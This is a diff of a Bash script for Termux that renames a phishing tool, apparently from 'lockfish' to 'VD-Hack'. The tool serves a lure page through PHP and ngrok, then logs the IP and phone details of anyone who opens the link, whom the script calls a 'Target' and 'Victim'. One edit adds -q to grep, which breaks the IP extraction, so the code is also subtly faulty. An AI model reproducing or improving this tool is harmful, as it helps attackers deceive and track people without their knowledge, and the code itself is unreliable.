@@ -17,11 +17,11 @@ R () {
 	}
 	set() {
 		cd $PREFIX/bin
-		if [ -e lock ];then
+		if [ -e vd ];then
 		echo
 		else
 		termux-setup-storage
-		bash ~/lockfish/setup.sh
+		bash ~/VD-Hack/setup.sh
 		fi
 		}
 		hi() {
@@ -71,7 +71,7 @@ command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not instal
 
 catch_ip() {
 
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+ip=$(grep -a -q 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 rm -f delete.txt
 				printf "\n\n\033[1;93m Checking Victim phone information........."
@@ -120,7 +120,6 @@ while [ true ]; do
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
-pwd
 rm -rf ip.txt
 
 fi
@@ -226,7 +225,7 @@ fi
 }
 
 ngrok_server() {
-cd ~/lockfish
+cd ~/VD-Hack
 if [[ -e ngrok ]]; then
 echo ""
 else
